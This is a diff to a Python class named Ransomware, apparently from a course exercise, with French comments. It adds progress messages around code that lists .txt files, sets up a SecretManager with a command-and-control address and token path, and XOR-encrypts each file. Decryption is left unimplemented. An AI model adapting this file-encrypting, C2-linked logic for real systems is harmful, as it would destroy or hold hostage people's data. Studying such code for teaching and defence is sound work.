@@ -48,13 +48,18 @@ class Ransomware:
         #lister les fichiers txt
         list = self.get_files("*.txt")
 
-        for i in range(len(list)):
-            print(f"Liste des fichiers txt trouvés : {list[i]}")
+        print(f"{len(list)} fichiers .txt trouvés")
+
+        #for i in range(len(list)):
+            #print(f"Fichier txt trouvé : {list[i]}")
         
         #appeler la classe SecretManager()
+        print("Initialisation de la classe SecretManager")
         call = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+        print("Appel de la fonction setup")
         call.setup()
 
+        print("Chiffrement des fichiers...")
         #chiffrement des fichiers
         for i in range(len(list)):
             call.xorfiles(list[i])
@@ -67,6 +72,7 @@ class Ransomware:
     def decrypt(self):
         # main function for decrypting (see PDF)
         raise NotImplemented()
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
